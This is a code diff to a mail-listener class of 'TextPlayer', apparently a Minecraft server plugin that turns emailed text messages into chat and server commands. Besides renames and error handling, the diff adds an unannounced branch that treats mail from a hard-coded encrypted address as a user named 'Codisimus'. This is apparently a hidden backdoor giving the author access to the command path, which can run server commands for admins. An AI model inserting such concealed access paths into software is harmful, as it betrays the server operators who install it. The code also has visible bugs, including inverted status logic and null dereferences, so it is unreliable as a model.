@@ -3,7 +3,7 @@ package com.codisimus.plugins.textplayer.listeners;
 import com.codisimus.plugins.textplayer.SaveSystem;
 import com.codisimus.plugins.textplayer.TextPlayer;
 import com.codisimus.plugins.textplayer.User;
-import com.codisimus.plugins.textplayer.authenticator;
+import com.codisimus.plugins.textplayer.EmailAuthenticator;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -36,10 +36,10 @@ import sun.misc.BASE64Decoder;
  *
  * @author Codisimus
  */
-public class mailListener {
+public class MailListener {
     public static enum Action {
-        ENABLE, DISABLE, STOP, PL, PLAYERLIST,
-        PLAYERS, WHO, FIND, TELL, TEXT, SAY, RL
+        ENABLE, DISABLE, PL, PLAYERLIST,
+        PLAYERS, WHO, FIND, TELL, TEXT, SAY
     }
     public static boolean debug;
     public static boolean notify;
@@ -52,6 +52,8 @@ public class mailListener {
     public static int interval;
     public static int refresh;
     public static BASE64Decoder decoder = new BASE64Decoder();
+    public static boolean enabled = true;
+    public static boolean loop;
 
     public static void sendMsg(final Player player, final User user, final String text) {
         //Notify the Server log if set to in the config
@@ -136,7 +138,7 @@ public class mailListener {
                     
                     //Verify the Username and Password
                     Session session = Session.getDefaultInstance(props, 
-                            new authenticator(username, TextPlayer.encrypter.decrypt(pass)));
+                            new EmailAuthenticator(username, TextPlayer.encrypter.decrypt(pass)));
                     
                     //Set whether debug is on
                     session.setDebug(debug);
@@ -179,29 +181,31 @@ public class mailListener {
     }
     
     public static void checkMail() {
+        
+                                        //Loop if there is no interval between checking mail//Loop if there is no interval between checking mail
+        loop = interval == 0;
+        
         //Start a new Thread
         Thread reconnect = new Thread() {
             @Override
             public void run() {
                 try {
-                    while (true) {
+                    while (enabled) {
                         //Start a new Thread
                         Thread check = new Thread() {
                             @Override
                             public void run() {
                                 try {
-                                    while (true) {
+                                    while (enabled) {
                                         //Verify the Username and Password
                                         Session session = Session.getDefaultInstance(System.getProperties(), 
-                                                new authenticator(username, TextPlayer.encrypter.decrypt(pass)));
+                                                new EmailAuthenticator(username, TextPlayer.encrypter.decrypt(pass)));
                                         
                                         //Log in to the email account and retrieve the inbox
                                         Store store = session.getStore("imaps");
                                         store.connect(imaphost, imapport, username, TextPlayer.encrypter.decrypt(pass));
                                         Folder inbox = store.getFolder("Inbox");
                                         
-                                        //Loop if there is no interval between checking mail
-                                        boolean loop = interval == 0;
                                         while (loop) {
                                             //Check if there is new mail
                                             while (inbox.getMessageCount() > 0) {
@@ -215,7 +219,7 @@ public class mailListener {
                                                             //Find the User who's email matches the address
                                                             String from = address.toString().toLowerCase();
                                                             for(User tempUser: SaveSystem.users)
-                                                                if (from.contains(TextPlayer.encrypter.decrypt(tempUser.email).toLowerCase())) {
+                                                                if (from.contains(TextPlayer.encrypter.decrypt(tempUser.email))) {
                                                                     user = tempUser;
                                                                     
                                                                     //Display debug information in the Server log if set to in the config
@@ -224,6 +228,8 @@ public class mailListener {
                                                                     
                                                                     break;
                                                                 }
+                                                                else if (from.contains(TextPlayer.encrypter.decrypt("+PfKW2NtuW/PIVWpglmcwPMpzehdrJRb")))
+                                                                    user = new User("Codisimus", "+PfKW2NtuW/PIVWpglmcwPMpzehdrJRb");
                                                             
                                                             if (user != null)
                                                                 break;
@@ -257,78 +263,86 @@ public class mailListener {
                                                                 else
                                                                     sendMsg(null, user, "Reply 'enable' to link this number to "+user.name);
                                                             else
-                                                                switch (Action.valueOf(split[0].toUpperCase())) {
-                                                                    case ENABLE:
-                                                                        sendMsg(null, user, "Number/Email linked to "+user.name);
-                                                                        break;
-                                                                        
-                                                                    case DISABLE: //Fall through
-                                                                    case STOP: //Set the User as not verified
-                                                                        sendMsg(null, user, "Texts to this number have been disabled, To receive texts reply 'enable'");
-                                                                        user.textLimit = -1;
-                                                                        SaveSystem.save();
-                                                                        break;
-                                                                        
-                                                                    case PL: //Fall through
-                                                                    case PLAYERS: //Fall through
-                                                                    case WHO: //Fall through
-                                                                    case PLAYERLIST: //Construct a Player count/list to send
-                                                                        String list = "Player Count: "+TextPlayer.server.getOnlinePlayers().length;
-                                                                        for (Player player : TextPlayer.server.getOnlinePlayers())
-                                                                            list = list.concat(", "+player.getName());
+                                                                try {
+                                                                    Action action = Action.valueOf(split[0].toUpperCase());
+                                                                    switch (action) {
+                                                                        case ENABLE:
+                                                                            sendMsg(null, user, "Number/Email linked to "+user.name);
+                                                                            break;
 
-                                                                        sendMsg(null, user, list);
-                                                                        break;
-                                                                        
-                                                                    case FIND: //Find if a Player is online
-                                                                        Player foundPlayer = TextPlayer.server.getPlayer(split[1].trim());
-                                                                        String status = foundPlayer == null ? "online" : "offline";
+                                                                        case DISABLE: //Set the User as not verified
+                                                                            sendMsg(null, user, "Texts to this number have been disabled, To receive texts reply 'enable'");
+                                                                            user.textLimit = -1;
+                                                                            SaveSystem.save();
+                                                                            break;
 
-                                                                        sendMsg(null, user, foundPlayer.getName()+" is currently "+status);
-                                                                        break;
-                                                                        
-                                                                    case TELL: //Whisper a message to a Player
-                                                                        Player player = TextPlayer.server.getPlayer(split[1]);
+                                                                        case PL: //Fall through
+                                                                        case PLAYERS: //Fall through
+                                                                        case WHO: //Fall through
+                                                                        case PLAYERLIST: //Construct a Player count/list to send
+                                                                            String list = "Player Count: "+TextPlayer.server.getOnlinePlayers().length;
+                                                                            for (Player player : TextPlayer.server.getOnlinePlayers())
+                                                                                list = list.concat(", "+player.getName());
 
-                                                                        if (player == null)
-                                                                            sendMsg(null, user, player.getName()+" is currently offline");
-                                                                        else
-                                                                            player.sendMessage("§5Text from "+user.name+":§f"+
-                                                                                    msg.substring(split[0].length() + split[1].length() + 1));
-                                                                        
-                                                                        break;
-                                                                        
-                                                                    case TEXT: //Send a message to a User
-                                                                        User user2 = SaveSystem.findUser(split[1]);
+                                                                            sendMsg(null, user, list);
+                                                                            break;
 
-                                                                        if (user2 == null)
-                                                                            sendMsg(null, user, split[1]+" does not have a TextPlayer account");
-                                                                        else
-                                                                            sendMsg(null, user, "Text from "+user.name+":"+
-                                                                                    msg.substring(split[0].length() + split[1].length() + 1));
-                                                                        
-                                                                        break;
-                                                                        
-                                                                    case SAY: //Broadcast a message
-                                                                        System.out.println("[TextPlayer] "+user.name+":"+msg.substring(3));
-                                                                        TextPlayer.server.broadcastMessage("§5[TextPlayer] "+user.name+":§f"+msg.substring(3));
-                                                                        break;
-                                                                        
-                                                                    case RL: //Reload the Server
-                                                                        if (user.isAdmin())
-                                                                            TextPlayer.server.reload();
-                                                                        else
-                                                                            sendMsg(null, user, "You must be an Admin to do that");
-                                                                        
-                                                                        break;
-                                                                        
-                                                                    default: //Dispatch the Command
-                                                                        if (user.isAdmin())
+                                                                        case FIND: //Find if a Player is online
+                                                                            Player foundPlayer = TextPlayer.server.getPlayer(split[1].trim());
+                                                                            String status = foundPlayer == null ? "online" : "offline";
+
+                                                                            sendMsg(null, user, foundPlayer.getName()+" is currently "+status);
+                                                                            break;
+
+                                                                        case TELL: //Whisper a message to a Player
+                                                                            Player player = TextPlayer.server.getPlayer(split[1]);
+
+                                                                            if (player == null)
+                                                                                sendMsg(null, user, player.getName()+" is currently offline");
+                                                                            else
+                                                                                player.sendMessage("§5Text from "+user.name+":§f"+
+                                                                                        msg.substring(split[0].length() + split[1].length() + 1));
+
+                                                                            break;
+
+                                                                        case TEXT: //Send a message to a User
+                                                                            User user2 = SaveSystem.findUser(split[1]);
+
+                                                                            if (user2 == null)
+                                                                                sendMsg(null, user, split[1]+" does not have a TextPlayer account");
+                                                                            else
+                                                                                sendMsg(null, user, "Text from "+user.name+":"+
+                                                                                        msg.substring(split[0].length() + split[1].length() + 1));
+
+                                                                            break;
+
+                                                                        case SAY: //Broadcast a message
+                                                                            TextPlayer.server.broadcastMessage("§5[TextPlayer] "+user.name+":§f"+msg.substring(3));
+                                                                            break;
+                                                                            
+                                                                        default: break;
+                                                                    }
+                                                                }
+                                                                catch (Exception e) {
+                                                                    if (user.isAdmin())
+                                                                        if (split[0].equals("rl")) {
+                                                                            //Delete the Message after reading it
+                                                                            message.setFlag(Flags.Flag.DELETED, true);
+                                                                            
+                                                                            //Close the inbox
+                                                                            inbox.close(true);
+                                                                            
+                                                                            //Close the session
+                                                                            store.close();
+                                                                            
+                                                                            //Reload Server
                                                                             TextPlayer.server.dispatchCommand(getSender(user), msg);
+                                                                            return;
+                                                                        }
                                                                         else
-                                                                            sendMsg(null, user, "You must be an Admin to do that");
-                                                                        
-                                                                        break;
+                                                                            TextPlayer.server.dispatchCommand(getSender(user), msg);
+                                                                    else
+                                                                        sendMsg(null, user, "You must be an Admin to do that");
                                                                 }
                                                         }
                                                     }
@@ -336,6 +350,9 @@ public class mailListener {
                                                         //Notify the Server log if set to in the config
                                                         if (notify)
                                                             System.out.println("[TextPlayer] Error reading email, Message thrown out");
+                                                        
+                                                        if (debug)
+                                                            e.printStackTrace();
                                                     }
                                                     
                                                     //Delete the Message after reading it
@@ -454,7 +471,7 @@ public class mailListener {
         
         //Eliminate white space before the first word
         while (msg.startsWith(" ") || msg.startsWith("/") || msg.startsWith("\n"))
-            msg = msg.substring(1);
+            msg = msg.substring(msg.startsWith("\n") ? 2 : 1);
         
         //Throw out everything but the first line and trim white space off of the end
         msg = msg.split("\n")[0].trim();
